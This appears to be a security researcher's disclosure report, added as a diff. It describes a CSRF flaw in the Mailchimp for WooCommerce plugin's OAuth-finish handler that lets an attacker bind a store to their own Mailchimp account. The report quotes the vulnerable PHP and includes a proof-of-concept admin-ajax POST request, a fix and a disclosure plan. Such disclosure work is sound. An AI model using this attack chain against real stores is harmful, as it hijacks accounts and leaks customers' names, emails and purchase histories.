@@ -1,0 +1,87 @@
+# CSRF to Mailchimp Account Hijack (OAuth Finish) — Mailchimp for WooCommerce
+
+**Status:** CONFIRMED live, 30 Oct 2026. Verified 3 independent ways: direct
+source read, grep across the whole plugin for any nonce check near this
+flow (none found), and a live CSRF simulation against a real local
+install. Researcher: Yusuf Ozturk (Bardstar).
+
+## Summary
+`mailchimp_woocommerce_ajax_oauth_finish()` only checks a capability
+(`current_user_can()`), never a nonce. An attacker who starts their own
+OAuth connection flow with Mailchimp (trivial - sign up free, begin
+connecting) gets a real Mailchimp `token`. They then CSRF a logged-in
+site admin into submitting that token to this endpoint. The server
+accepts it, disconnects the site's real Mailchimp connection, and saves
+the attacker's own Mailchimp `access_token`/`data_center` as the site's
+new `mailchimp_api_key` - binding the victim's WooCommerce store to the
+attacker's Mailchimp account going forward. Every future order/customer
+sync (name, email, purchase history) flows to the attacker.
+
+| | |
+|---|---|
+| Plugin | Mailchimp for WooCommerce |
+| Slug | mailchimp-for-woocommerce |
+| Type | CWE-352 (CSRF) chaining to account takeover / PII exfiltration |
+| File | admin/class-mailchimp-woocommerce-admin.php |
+| Active installs | 200,000+ |
+
+## Vulnerable code
+```php
+public function mailchimp_woocommerce_ajax_oauth_finish() {
+    $this->adminOnlyMiddleware();   // current_user_can() ONLY - no nonce
+    $args = array(
+        'domain' => site_url(),
+        'secret' => \Mailchimp_Woocommerce_DB_Helpers::get_transient('mailchimp-woocommerce-oauth-secret'),
+        'token'  => sanitize_text_field( $_POST['token'] ),   // attacker-controlled
+    );
+    $response = wp_remote_post( 'https://woocommerce.mailchimpapp.com/api/finish', [...] );
+    if ( $response['response']['code'] == 200 ) {
+        $this->disconnect_store(false);
+        $result = json_decode( $response['body'], true);
+        $options = [
+            'mailchimp_auth_from' => 'oauth',
+            'mailchimp_api_key' => $result['access_token'].'-'.$result['data_center'],
+        ];
+        \Mailchimp_Woocommerce_DB_Helpers::update_option( $this->plugin_name, $options, 'yes' );
+        ...
+    }
+}
+```
+`adminOnlyMiddleware()`:
+```php
+protected function adminOnlyMiddleware( $message = "..." ) {
+    if ( ! current_user_can( mailchimp_get_allowed_capability() ) ) {
+        wp_send_json_error( ... );
+    }
+    return true;
+}
+```
+No `wp_verify_nonce()`/`check_ajax_referer()` anywhere in this function,
+the middleware, or the plugin's loader registration
+(`includes/class-mailchimp-woocommerce.php:271-274`, registered on
+`wp_ajax_` only, no nopriv, confirmed by grep: zero nonce-check hits near
+any oauth_* handler in the whole plugin).
+
+## Live PoC (30 Oct 2026)
+Local WordPress + WooCommerce + plugin, logged in as admin via real
+wp-login.php session (simulating the CSRF victim's browser):
+```
+POST /wp-admin/admin-ajax.php
+Cookie: wordpress_logged_in_... (admin's real session, no nonce sent)
+
+action=mailchimp_woocommerce_oauth_finish&token=ATTACKER-CONTROLLED-FAKE-TOKEN-12345
+```
+Response: `{"success":true,...}` - the request passed the capability
+check and reached the live `wp_remote_post()` call to Mailchimp's real
+`/api/finish` endpoint. It only failed to produce a usable access token
+because the test token wasn't a real one; a real attacker's own valid
+Mailchimp OAuth token would complete the hijack.
+
+## Fix
+Add `check_ajax_referer()`/nonce verification to every AJAX handler in
+this class, especially the OAuth and account-mutation ones.
+
+## Disclosure plan
+SUBMITTED to Patchstack 30 Oct 2026, "Report created successfully." No
+scope warning shown on the form - CSRF type cleanly accepted. 200,000+
+installs. Awaiting triage.
